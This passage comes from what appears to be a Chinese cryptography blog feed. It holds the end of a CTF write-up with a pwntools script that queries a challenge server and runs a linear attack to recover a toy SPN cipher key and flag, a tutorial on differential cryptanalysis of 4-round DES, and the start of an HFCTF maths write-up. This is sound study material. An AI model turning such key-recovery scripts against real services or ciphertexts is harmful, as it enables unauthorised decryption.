class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line">import os, sys</span><br><span class="line">from binascii import hexlify, unhexlify</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SZ = 8</span><br><span class="line">offset = [[0 <span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(256)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(256)]  #Sbox线性估计offset</span><br><span class="line">linearInput = []</span><br><span class="line">sbox, sboxi, plain, cipher = [], [], [], []</span><br><span class="line">enc_flag = None</span><br><span class="line">coef = [15, 11, 155, 119, 11, 99, 83, 249]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def getData(ip, port):</span><br><span class="line">    <span class="keyword">global</span> enc_flag, sbox, sboxi</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line">    sbox_str = io.recvline()</span><br><span class="line">    sbox = eval(sbox_str)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(256):</span><br><span class="line">    sboxi.<span class="keyword">append</span>(sbox.<span class="built_in">index</span>(i))</span><br><span class="line">    enc_flag = io.recvline().strip().<span class="keyword">decode</span>(<span class="string">"utf8"</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(10000):</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">"[+] Getting data...(&#123;&#125;/10000)"</span>.<span class="keyword">format</span>(i))</span><br><span class="line">        pt = hexlify(os.urandom(8)).<span class="keyword">decode</span>(<span class="string">"utf8"</span>)</span><br><span class="line">        plain.<span class="keyword">append</span>(pt)</span><br><span class="line">        io.sendline(pt)</span><br><span class="line">        <span class="keyword">ct</span> = io.recvline().strip().<span class="keyword">decode</span>(<span class="string">"utf8"</span>)</span><br><span class="line">        <span class="keyword">print</span>(<span class="keyword">ct</span>,pt)</span><br><span class="line">        cipher.<span class="keyword">append</span>(<span class="keyword">ct</span>)</span><br><span class="line">    io.<span class="keyword">close</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def doxor(l1, l2):</span><br><span class="line">    <span class="keyword">return</span> [x[0] ^ x[1] <span class="keyword">for</span> x <span class="keyword">in</span> <span class="keyword">zip</span>(l1, l2)]</span><br><span class="line"></span><br><span class="line"># 线性层</span><br><span class="line">def trans(blk):</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="keyword">range</span>(0, SZ, 8):</span><br><span class="line">        cur = blk[k:k+8]</span><br><span class="line">        cur = [(cur[i] * coef[i]) % 256 <span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(8)]</span><br><span class="line">        bits = [bin(x)[2:].rjust(8, '0') <span class="keyword">for</span> x <span class="keyword">in</span> cur]</span><br><span class="line">        bits = bits[-1:] + bits[:-1]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(8):</span><br><span class="line">            res.<span class="keyword">append</span>(int(''.join([x[i] <span class="keyword">for</span> x <span class="keyword">in</span> bits]), 2))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def bitxor(<span class="keyword">n</span>, mask):</span><br><span class="line">    bitlist = [int(x) <span class="keyword">for</span> x <span class="keyword">in</span> bin(<span class="keyword">n</span> &amp; mask)[2:]]</span><br><span class="line">    <span class="keyword">return</span> bitlist.<span class="keyword">count</span>(1) % 2</span><br><span class="line"></span><br><span class="line"># Sbox线性估计</span><br><span class="line">def linearSbox():</span><br><span class="line">    <span class="keyword">global</span> linearInput</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(256):</span><br><span class="line">        si = sbox[i]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="keyword">range</span>(256):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="keyword">range</span>(256):</span><br><span class="line">                a = bitxor(i, j) # 线性估计输入</span><br><span class="line">                b = bitxor(si, k) # 线性估计输出 </span><br><span class="line">                <span class="keyword">if</span> a == b:</span><br><span class="line">                    offset[j][k] += 1</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(256):</span><br><span class="line">        offset[i] = [<span class="built_in">abs</span>(x - 128) / 256 <span class="keyword">for</span> x <span class="keyword">in</span> offset[i]]</span><br><span class="line">    <span class="keyword">for</span> linearOutput <span class="keyword">in</span> <span class="keyword">range</span>(256):</span><br><span class="line">        cur = [x[linearOutput] <span class="keyword">for</span> x <span class="keyword">in</span> offset]</span><br><span class="line">        linearInput.<span class="keyword">append</span>(cur.<span class="built_in">index</span>(<span class="built_in">max</span>(cur)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def calcOffset(pt, <span class="keyword">ct</span>, j, guessed_key):  # 猜测第j段子密钥</span><br><span class="line">    pt = <span class="keyword">list</span>(unhexlify(pt))</span><br><span class="line">    <span class="keyword">ct</span> = <span class="keyword">list</span>(unhexlify(<span class="keyword">ct</span>))</span><br><span class="line">    <span class="keyword">ct</span>[j] ^= guessed_key</span><br><span class="line">    <span class="keyword">ct</span>[j] = sbox[<span class="keyword">ct</span>[j]] # sbox即为sboxi的逆</span><br><span class="line">    <span class="keyword">ct</span>[j] = (<span class="keyword">ct</span>[j] * coef[j]) % 256</span><br><span class="line">    u1 = bitxor(pt[0], linearInput[1 &lt;&lt; ((6 - j) % 8)])</span><br><span class="line">    u2 = bitxor(<span class="keyword">ct</span>[j], 0b10000000)</span><br><span class="line">    <span class="keyword">if</span> u1 == u2:</span><br><span class="line">        <span class="keyword">return</span> True</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def linearAttack():</span><br><span class="line">    key2 = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(8): # 第二轮子密钥的第i段</span><br><span class="line">        <span class="keyword">count</span> = [0 <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="keyword">range</span>(256)]</span><br><span class="line">        <span class="keyword">for</span> guessed_key <span class="keyword">in</span> <span class="keyword">range</span>(256):</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">"[+] Cracking key...(&#123;&#125;-&#123;&#125;)"</span>.<span class="keyword">format</span>(i, guessed_key))</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="keyword">range</span>(10000):</span><br><span class="line">                <span class="keyword">if</span> calcOffset(plain[j], cipher[j], i, guessed_key) == True:</span><br><span class="line">                    <span class="keyword">count</span>[guessed_key] += 1</span><br><span class="line">        bias = [<span class="built_in">abs</span>(x - 5000) / 10000 <span class="keyword">for</span> x <span class="keyword">in</span> <span class="keyword">count</span>]</span><br><span class="line">        key2.<span class="keyword">append</span>(bias.<span class="built_in">index</span>(<span class="built_in">max</span>(bias)))</span><br><span class="line">    <span class="keyword">return</span> key2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def getkey(key2):</span><br><span class="line">    <span class="keyword">ct</span> = <span class="keyword">list</span>(unhexlify(cipher[0]))</span><br><span class="line">    pt = <span class="keyword">list</span>(unhexlify(plain[0]))</span><br><span class="line">    cur = doxor(<span class="keyword">ct</span>, key2)</span><br><span class="line">    cur = [sbox[x] <span class="keyword">for</span> x <span class="keyword">in</span> cur]</span><br><span class="line">    cur = trans(cur)</span><br><span class="line">    cur = [sboxi[x] <span class="keyword">for</span> x <span class="keyword">in</span> cur]</span><br><span class="line">    key = doxor(cur, pt) + key2</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def decrypt_block(<span class="keyword">ct</span>, key):</span><br><span class="line">    cur = doxor(<span class="keyword">ct</span>, key[SZ:])</span><br><span class="line">    cur = [sbox[x] <span class="keyword">for</span> x <span class="keyword">in</span> cur]</span><br><span class="line">    cur = trans(cur)</span><br><span class="line">    cur = [sboxi[x] <span class="keyword">for</span> x <span class="keyword">in</span> cur]</span><br><span class="line">    cur = doxor(cur, key[:SZ])</span><br><span class="line">    <span class="keyword">return</span> cur</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def decrypt(<span class="keyword">ct</span>, key):</span><br><span class="line">    pt = b''</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(0, len(<span class="keyword">ct</span>), SZ * 2):</span><br><span class="line">        block_ct = <span class="keyword">list</span>(unhexlify(<span class="keyword">ct</span>[i : i + SZ * 2]))</span><br><span class="line">        block_pt = decrypt_block(block_ct, key)</span><br><span class="line">        pt += bytes(block_pt)</span><br><span class="line">    <span class="keyword">return</span> pt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    getData('node4.buuoj.cn', 27125)</span><br><span class="line">    linearSbox()</span><br><span class="line">    key2 = linearAttack()</span><br><span class="line">    key = getkey(key2)</span><br><span class="line">    <span class="keyword">print</span>(key)</span><br><span class="line">    flag = decrypt(enc_flag, key)</span><br><span class="line">    <span class="keyword">print</span>(flag)</span><br></pre></td></tr></table></figure><p>那么对于这道简单的两轮分组密码的线性分析就到此告一段落了，但对于分组密码的学习不会到此为止，因为，还有高阶差分、截断差分、不可能差分……</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol><li>《分组密码的攻击方法与实例分析》(李超,孙兵,李瑞林) SS=12567685</li><li><a href="https://0xdktb.top/2020/04/19/WriteUp-NPUCTF-Crypto/EzSPN.pdf" target="_blank" rel="noopener">https://0xdktb.top/2020/04/19/WriteUp-NPUCTF-Crypto/EzSPN.pdf</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 密码小屋 </category>
          
          <category> Block </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SPN </tag>
            
            <tag> 线性密码分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学学习笔记 之 差分分析入门篇——四轮DES</title>
      <link href="/2021/07/16/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%B7%AE%E5%88%86%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8%E7%AF%87%E2%80%94%E2%80%94%E5%9B%9B%E8%BD%AEDES/"/>
      <url>/2021/07/16/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%B7%AE%E5%88%86%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8%E7%AF%87%E2%80%94%E2%80%94%E5%9B%9B%E8%BD%AEDES/</url>
      
        <content type="html"><![CDATA[<p>首发于<a href="https://www.anquanke.com/post/id/249403" target="_blank" rel="noopener">安全客</a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>密码学学习笔记断更快半年了，最近又重新拾起了对密码学的学习，以一篇对四轮DES的差分分析“复出”。</p><p>对于差分密码分析的学习，参考《分组密码的攻击方法与实例分析》</p><p>这里就不重新介绍一遍DES的算法流程了，网上一大把。我们研究对DES算法的分析时，由于DES的初始置换及其逆置换均以公开，故在安全性分析时就可以将其忽略。另外我们这里暂且只分析四轮DES，所以有很多概率相关的概念也可以暂时不用涉及。</p><p>DES差分分析的关键就在于其S盒差分分布的不均匀特性，何为不均匀特性，即相同的差分进入S盒，输出的差分是不均匀分布的。</p><p>不过在详细介绍之前，还是先声明一些概念比较好。</p><h2 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h2><p><strong>迭代分组密码的加密流程</strong></p><p>假设所讨论的迭代分组密码为</p><p>$E:{0,1}^n × {0,1}^l \rightarrow {0,1}^n$，</p><p>其中 $n$ 为分组长度， $l$ 为密钥长度，任给 $k \in {0,1}^l, E(\cdot,k)$ 是 ${0,1}^n$ 上的置换，加密函数 $E_k(\cdot)$ 由子密钥 $k_i$ 控制的轮函数 $F(\cdot,k_i) = F _ {k _ i}(\cdot)$ 迭代 $r$ 次生成，即</p><p>$E_ k(x)=F _ {k _ r} \circ F _ { k _ {r-1}} \circ \cdots \circ F _ {k _ {2}} \circ F _ {k _ {1}(x)}$ </p><p>其中，轮密钥 $k_i,i=1,2,\cdots,r,$ 由密钥拓展算法对种子密钥 $k$ 进行拓展生成，为方便起见，假设第 $i$ 轮输入和输出分别为 $Y_{i-1}$ 和 $Y_i$，即 $Y_i = F_ {k _i}(Y _ {i-1})$；若明文为$X$ ，则第一轮输入为 $Y_0 = X$；若该分组密码算法有 $r$ 轮，且设密文为 $Z$，则 $Z = Y_r$</p><p><img src="https://i.loli.net/2021/07/16/c6fw2oDg43kVPbv.png" alt="image-20210716094603863"></p><p><strong>差分值</strong></p><p>设 $X,X^* \in {0,1}^n,$ 则 $X$ 和 $X ^ <em>$ 的差分值定义为 $\Delta X = X \oplus X^</em>$</p><p><strong>差分对</strong></p><p>设 $\alpha , \beta \in {0,1}^n,$ 假设迭代分组密码的输入对$(X,X^<em>)$ 的差分值为 $X \oplus X^</em> = \alpha$，经过 $i$ 轮加密之后，输出对 $(Y_i,Y_i^<em>)  $ 的差分值为 $Y_i \oplus Y_i^</em> = \beta$，则称$(\alpha,\beta)$ 为该分组密码的一个 $i$ 轮差分对，特别地，当 $i=1$ 时，$(\alpha , \beta)$显示了论函数 $F$ 的差分传播特性，称 $\alpha$ 为 $F$ 的输入差分，$\beta$ 为 $F$ 的输出差分。</p><p>由于这里我们暂且之分析四轮DES，故上述概念就已足够。</p><p>首先我们先分析输入差分经过论函数 $F$ 的基本组件后输出差分的性质：</p><ol><li>密钥加：$(x \oplus k) \oplus(x^* \oplus k) = x \oplus x^*$</li><li>拓展变换 $E$：$E(x \oplus k)\oplus E(x^* \oplus k) = E(x \oplus k \oplus x^* \oplus k) = E(x \oplus x^*)$</li><li>$S$ 盒：$S(x) \oplus S(x^<em>) = y \oplus y^</em>$，结果不确定，不仅与$x \oplus x^*$ 有关，还与 $x$ 有关</li><li>$P$ 置换：$P(y) \oplus P(y^<em>) = P(y\oplus y^</em>)$</li></ol><p>我们可以看到，基本组件中除 $S$  盒外，其他线性组件的差分传播都是确定的，只有 $S$ 盒这个非线性组件使得差分传播存在不确定性。而一般来说，只有通过不确定性才能获得信息量，因此，<strong>对论函数的差分分析在本质上是根据 $S$ 盒的差分传播特性来恢复密钥。</strong></p><p>因此，为恢复轮函数 $F$ 中进入第 $i$ 个 $S$ 盒的密钥，我们选择明文对 $(x,x^<em>)$，使得进入第 $i$ 个 $S$ 盒的输入差分非零。然后我们需要获得此次轮函数的输出差分$\Delta = F(x\oplus k)\oplus F(x^</em> \oplus k)$，根据 $P$ 置换的可逆性，求得 $\delta = P^{-1}(\Delta)$，<strong>由$(E(x),E(x^*),\delta)$ 可建立第 $i$ 个 $S$ 盒的差分分析模型。</strong>（注：这里的$E(x),E(x^*)$ 为拓展变换 $E$）</p><h2 id="4轮-DES-算法的差分分析"><a href="#4轮-DES-算法的差分分析" class="headerlink" title="4轮 DES 算法的差分分析"></a>4轮 DES 算法的差分分析</h2><p>流程图如下</p><p><img src="https://i.loli.net/2021/07/16/Rn3cVTrO5yw7b1f.png" alt="image-20210716102741455"></p><p>我们记：</p><ol><li>明文对和相应的差分记为$(P,P^*)$ 和 $P’$</li><li>密文对和相应的差分记为$(T,T^*)$ 和 $T’$</li><li>明文左半部分、右半部分及其差分记为$(L,R)$ 和 $(L’,R’)$</li><li>密文左半部分、右半部分及其差分记为$(l,r)$ 和 $(l’,r’)$</li><li>第1、2、3、4轮函数的输入和输入差分依次记为$a,b,c,d$ 和 $a’, b’,c’,d’$</li><li>第1、2、3、4轮函数的输出和输出差分依次记为$A,B,C,D$ 和 $A’, B’,C’,D’$</li></ol><p>4轮DES的差分分析本质上仍然是对S和的差分分析，</p><ol><li><p>首先我们由密文对 $T = (l,r),T^* = (l^<em>,r^</em>),$可以获得第4轮轮函数的输入对$(r,r^<em>)$，进而也可以获得8个 $S$ 盒的输入对（密钥加之前的数据）为 $(E(r),E(r^</em>));$ <strong>简单分析 $S$ 盒针对差分的扩散特性以及拓展变换 $E$ 的性质可知，第 4 轮轮函数的输入差分 $r’$ 也即 $d’$ 经过拓展变换 $E$ 后（成为 $S$ 盒的输入差分)，$E(r’)$ 几乎会让 8 个 $S$ 盒 都活跃，即这个 8 个 $S$ 盒的输入差分都非0。</strong></p></li><li><p>第 4 轮轮函数的输出差分为 $D’ = l’ \oplus c’ = l’ \oplus a’ \oplus B’$ ,其中 $l’ = l \oplus l^<em>$，已知。$a’ = 00000000$，$B’ = P(*0000000)$，其中 $</em>$ 为未知的 4 比特向量，表示当第 2 轮轮函数中第一个 $S$ 盒 $S_1$ 的输入差分为 04（由于拓展变换）时可能的输出差分，未知。从而，第4轮轮函数中 8 个 $S$ 盒的输出差分为 $P^{-1}(D’)=P^{-1}(l’ \oplus P(<em>0000000)) = P^{-1}(l’) \oplus (</em>0000000)$，可求。故第四轮中$S_2,S _3,S _ 4, S _ 5, S _ 6, S _ 7, S _ 8$ 共 7 个$S$ 盒的输出差分均可求。</p></li><li><p>由上述两个步骤我们可以建立对7个$S$ 盒的差分分析模型，通过对$S$ 盒的差分分析，我们可以恢复 $7 × 6 = 42$ bit 的轮密钥，由密钥拓展算法，其他 $14$ bit 的密钥可通过穷尽搜索恢复。</p><p>上述攻击中我们未能恢复第 4 轮中进入第一个 $S$ 盒的密钥，是因为它的输出差分未知，因此我们可以选择另外的明文差分，让第二轮的输入差分经过拓展变换后导致第 1 个 $S$ 盒不活跃，即输入差分为0，这样我们就可求得第四轮中第 1 个 $S$ 盒得差分输出了。进而只用再穷尽搜索其他 $8$bit 密钥。</p></li></ol><p>好的，上面大部分是《分组密码的攻击方法与实例分析》书中的原话。现在，我再用通俗易懂的话来翻译翻译。（也就是讲的再细一点啦）</p><h2 id="笔者的“翻译”"><a href="#笔者的“翻译”" class="headerlink" title="笔者的“翻译”"></a>笔者的“翻译”</h2><p>我们看到，首先我们构造差分 $L’$为 20000000 ，$R’$ 为 00000000，这没什么问题，右下角的x脚标说明这是个十六进制表示，不过注意这里的$L’,R’$已经是$IP$ 置换过后的了，不是明文差分 $X’$ 的左右两部分哦，是$IP(X’)$的左右两部分。</p><p>然后我们这些个差分进入<strong>第一轮</strong>，右边的$a’=00000000$ 进到 $F$ 轮函数，由于是$00000000$，怎么线性非线性变换都没所谓，先$E$ 盒拓展，再轮密钥加，最后出了$S$ 盒也还是 $00000000$，再走一个$P$盒置换$P(00000000)$也还是 $00000000$。<strong>所以第一轮走完</strong>，左边差分等于 $A’ \oplus L’=00000000 \oplus 20000000=20000000$，右边还是原来的 $a’=00000000$</p><p><strong>到了第二轮</strong>，这个轮函数的输入是 $b’ = A’ \oplus L’=20000000$，先先$E$ 盒拓展，变成40000000，然后分为八组进入$S$ 盒，显然后面 7 组都是0，不会激活 $S$ 盒，那出来还是0。（可能会突然疑惑，轮密钥加呢？看到最上面的差分经过 $F$ 函数各个组件的性质第一条，差分不受轮密钥加的影响，所以后面也都不管它了）但是第一组是以差分为 4 进入 $S$ 盒的，由于性质第三条，$S$ 盒的输出差分不确定，这与输出差分有关，也与具体的输出有关。所以，这一轮 $S$ 盒的输出差分为 <strong>*0000000</strong>，之后还得 $P$ 盒置换，所以$B’ = P(<em>0000000)$。*</em>那么第二轮走完*<em>，左边等于$B’ \oplus R’ = P(</em>0000000) \oplus 00000000=P(*0000000)$，右边等于$b’ = 20000000$</p><p><strong>开始第三轮</strong>，这一轮开始就要乱起来了。首先这个轮函数的输入是 $c’ = B’ \oplus R’= P(*00000000)$，我们看一下具体的 $P$ 盒，</p><p><img src="https://i.loli.net/2021/07/16/RqXyO4evtG2ITh1.png" alt="image-20210716145106845"></p><p>这里我们不确定的前四个bit被扩散到了第3，5，6，8组，也就是说现在我们的$c’ = 00<em>0**0</em>$，然后这里还要先$E$ 盒拓展，看看 $E$ 盒</p><p><img src="https://i.loli.net/2021/07/16/8yswI2QWfiuENgK.png" alt="image-20210716152720348"></p><p>那么进入$S$ 盒前<img src="https://i.loli.net/2021/07/19/DbuGAxfJZm7roQU.png" alt="image-20210719103406864"></p><p>可以看到，几乎每一组都被”污染了“，只剩第5组还是 0 那么 $C’ = <strong><em>*0</em></strong>$，然后这里还有一个 $P$ 盒置换，<strong>那么第三轮走完，</strong>左边等于$C’ \oplus b’ = 20000000 \oplus P(<strong><em>*0</em></strong>)$，右边等于$c’ = <strong><em>*0</em></strong>$（注，这里 * 为不确定的意思，进入$S$ 盒前的 * 大概率不等于出 $S$ 盒后的 *）</p><p><strong>到最后的第四轮了</strong>，此时进入 $S$ 盒的是$d’ = C’ \oplus b’$,万幸只有四轮，所以$d’ = r’$,由于$r’$ 是可由最后的输出密文右半部分求一个$IP$ 逆置换而来，因此，$d’$ 已知。</p><p>我们直接计算$d’$ 可以发现 $d’$几乎不会有 0 bit，也可以推一下，因为 $d’ = P(<strong><em>*0</em></strong>) \oplus 20000000$，而由于这个$P$ 盒置换，第5组最终也会被”污染“，那么可以预见，每一组进入 $S$ 盒的差分都被”污染“了，也就是说每一个 $S$ 盒都会被激活。这也就是书中所说的<strong>简单分析 $S$ 盒针对差分的扩散特性以及拓展变换 $E$ 的性质可知，第 4 轮轮函数的输入差分 $r’$ 也即 $d’$ 经过拓展变换 $E$ 后（成为 $S$ 盒的输入差分)，$E(r’)$ 几乎会让 8 个 $S$ 盒 都活跃，即这个 8 个 $S$ 盒的输入差分都非0。</strong></p><p>那么到此四轮DES分析完毕。其实也就说明了一个问题，进入第四轮的 $S$ 盒的输入会激活所有的 $S$ 盒，然后进入第四轮 $S$ 盒的输入差分已知，从第四轮后面7个 $S$ 盒出来的输出差分可求，由此我们可以建立对这7个$S$ 盒的差分分析模型以求出第四轮的轮密钥。</p><p>接下来简单讲讲具体怎么求。</p><p>首先拿到最后的输出明文差分 $Y’$,首先对右半边求 $IP$ 逆置换得到 $d’=r’$，然后对其用 $E$盒 做拓展置换。先打住，我们去求一下第四轮 $S$ 盒 的输出差分$P^{-1}(D’)$</p><p>我们拿到输出明文差分$Y’$,对做半边求 $IP$ 逆置换得到 $l’ = c’ \oplus D’$,这个$c’ = a’ \oplus B’ = 00000000 \oplus P(<em>00000000) $，所以$P^{-1}(D’) = P^{-1}(c’ \oplus l’)=P^{-1}(a’ \oplus B’ \oplus l’) = P^{-1}(P(</em>0000000) \oplus l’)$</p><p>好了，我们有了$S$盒输入差分$E(IP^{-1}(Y’_r))$，有了 $S$ 盒输出差分 $P^{-1}(P(*0000000) \oplus IP^{-1}(Y’_l)$，现在我们对每个 $S$ 盒开始爆破其相干的轮密钥分组了</p><p>第四轮的轮密钥会分为8组，分别和经过 $E$ 盒拓展置换的 8 组输入异或后最终进入 $S$ 盒。这8组输入差分在与轮密钥异或前后是不会变的，但是我们再次强调前面提到过的第三条性质：<strong>$S$ 盒：$S(x) \oplus S(x^<em>) = y \oplus y^</em>$，结果不确定，不仅与$x \oplus x^*$ 有关，还与 $x$ 有关</strong>。输入的差分没变，但是两次输入的具体值因为轮密钥的异或，会发生变化。因此改变这里的轮密钥，是会使得 $S$ 盒的输出差分受影响的。</p><p>但是呢，但是呢，我们不是已经知道输出差分了么？啊哈，那么很显然了，我们只要不断地尝试每个 $S$ 盒那一组的轮密钥——轮密钥加，再 $S$ 盒输出差分，然后对比我们已知的输出差分，如果匹配，则该轮密钥放入待选集合。由于每个 $S$ 盒只用到 6bit 轮密钥，因此穷举复杂度只有 $7× 2^6$，完全可以接受。然后会出现多解的情况。换一组具有相同差分（非必须，差分为40000000 00000000也可）的明文输入，得到一个新的解集，再取交集即可。根据实际情况，一般取四对差分明文就能有很大概率解出 42 bit的轮密钥。</p><p>然后现在有两个选择，一个是选择复杂度为 $2^{14}$ 穷举，另一个是换一下差分，不要激活到第一个 $S$ 盒就行。这样就能恢复全部的48 bit密钥，然后再进行复杂度为 $2^8$ 的穷举，两种复杂度倒也都是能接受的。</p><p>有了48bit的轮密钥后，我们知道密钥拓展用的压缩 $P$ 盒</p><ol><li>所以我们先根据 $P$ 盒将 48 bit 的密钥位置先还原，</li><li>剩下的空位再直接穷举，最后得到56bit的轮密钥，</li><li>然后根据轮密钥生成的方式，将第四轮轮密钥还原成最初的密钥，</li><li>然后我们选取一对服务端生成的明文密文对，用我们的密钥对明文进行加密，</li><li>观察得到的密文是否与服务端生成的密文一致，若一致则得到正确密钥，否则回到第二步。</li></ol><p>至此，4轮DES差分就到此结束了。可以看到，还没有用到概率论的知识，这是因为轮次比较少，前面我们分析的每一轮都是确定的，而等轮次增大到8轮以后就要开始引入统计分析与概率论了，取寻找概率较大的差分路径，这才是差分分析的完全体。</p><p><strong>Remark</strong>：前面我们提到，<strong>DES差分分析的关键就在于其S盒差分分布的不均匀特性，何为不均匀特性，即相同的差分进入S盒，输出的差分是不均匀分布的。</strong>现在回头来看看这句话应该就能理解了，如果S盒差分分布均匀，相同地输入差分能够得到相同的输出差分，那么，我们就没办法去穷举验证我们的轮密钥了，因为我们没有了标准去区分密钥的正确与否。</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>差分分析入门篇到此告一段落，希望接下来能有进阶篇叭，如果我学的会，能够理解的话哈哈哈哈哈哈哈哈哈哈哈哈哈。</p>]]></content>
      
      
      <categories>
          
          <category> 密码小屋 </category>
          
          <category> Block </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DES </tag>
            
            <tag> 差分密码分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021 HFCTF</title>
      <link href="/2021/04/04/2021HFCTF/"/>
      <url>/2021/04/04/2021HFCTF/</url>
      
        <content type="html"><![CDATA[<p>这次比赛没啥人打，随便看了看题，但是看了一题就把心态看崩了，还是一道都被六十多人做出来的题，已经这么菜了么，呜呜呜。</p><h1 id="cube"><a href="#cube" class="headerlink" title="cube"></a>cube</h1><h2 id="解题前的阿巴阿巴"><a href="#解题前的阿巴阿巴" class="headerlink" title="解题前的阿巴阿巴"></a>解题前的阿巴阿巴</h2><p>这哪里是密码题，分明就是数学题。让你给出六对(x,y,z)，满足$\frac{x}{y+z}+\frac{y}{x+z}+\frac{z}{x+y} = 6$，（欺负人数学不好吗日，感受到深深恶意）</p><p>自己做肯定是不会做的，这里找到这个问题的<a href="https://mlzeng.com/an-interesting-equation.html" target="_blank" rel="noopener">相关页面</a>了</p><p>介绍的做法是这样的。首先这条式子可以转化为$x^3 + y^3 + z^3 - 5 * x^2 * (y + z) - 5 * y^2 * (z + x) - 5 * z^2 * (x + y) - 9 * x * y * z = 0$</p><p>可以发现是一条三次曲线，然后通过变量替换（对x，y，z进行线性组合映射为X，Y，Z，也可以看作换坐标系）将这条三次曲线映射为一条椭圆曲线。</p><p>上述页面的问题是$\frac{x}{y+z}+\frac{y}{x+z}+\frac{z}{x+y} = 4$，但没事，我们把这个问题搞懂应该就可以举一反三了。</p><p>他用的线性变换是这样子的$(X,Y,Z)^T=\begin{bmatrix} -\frac{95}{2} &amp; -\frac{95}{2} &amp; \frac{277}{12} \newline -\frac{91}{2} &amp; \frac{91}{2} &amp; 0 \newline -6 &amp; -6 &amp; 1 \newline\end{bmatrix} (x,y,z)^T$</p><p>可以验证$X^3-\frac{11209}{48}X Z^2+\frac{1185157}{864}Z^3-Y^2 Z=8281(x^3 + y^3 + z^3 - 3x^2(y+z) - 3y^2(z+x) - 3z^2(x+y) - 5xyz)$</p><p>这样子问题就转变为求$x^3-\frac{11209}{48}x z^2+\frac{1185157}{864}z^3-y^2 z=0$</p><p>这里我们再固定$z=1$，式子就简化为$x^3-\frac{11209}{48}x+\frac{1185157}{864}-y^2=0$，就是一条Weierstrass equations了。</p><p>这样我们就可以把数对(x,y,z)映射为这条椭圆曲线上的一个点了，然后文章给出了一个结论，如果映射后的有理点落在下图的红色区域，那么这个数对的三个数就都是正数了。</p><p><img src="https://mlzeng.com/image/an-interesting-equation/rr.png" alt="rr.png"></p><p>文章说<strong>It is easy to verify</strong>（有感受到深深的恶意）这个有理点要落在$x\in(\frac{-39 \sqrt{65}-109}{24},\frac{-84 \sqrt{3}-59}{12})\cup(\frac{84 \sqrt{3}-59}{12},\frac{95}{12})$这个区域，我们的数对就都是正整数了。</p><p>然后由于在椭圆曲线上有点加法，所以思路就是：</p><p>我们可以先获得一个满足方程的初始点，然后通过不断地对这个点进行运算，使其落入到这个区域中，再把区域内的点反映射成数对(x,y,z)，那么我们就解决这个问题了。</p><p>但是，但是，但是，最重要的是，这篇文章没有给出这个线性变换矩阵的获得方式（让我去推？不如让我去死）</p><p>后来啊，coin给俺来了一个描述这个问题的<a href="https://www.quora.com/How-do-you-find-the-positive-integer-solutions-to-frac-x-y+z-+-frac-y-z+x-+-frac-z-x+y-4" target="_blank" rel="noopener">网页</a>，我在评论区找到了这个，运行平台是<a href="http://magma.maths.usyd.edu.au/calc/" target="_blank" rel="noopener">Magma</a></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 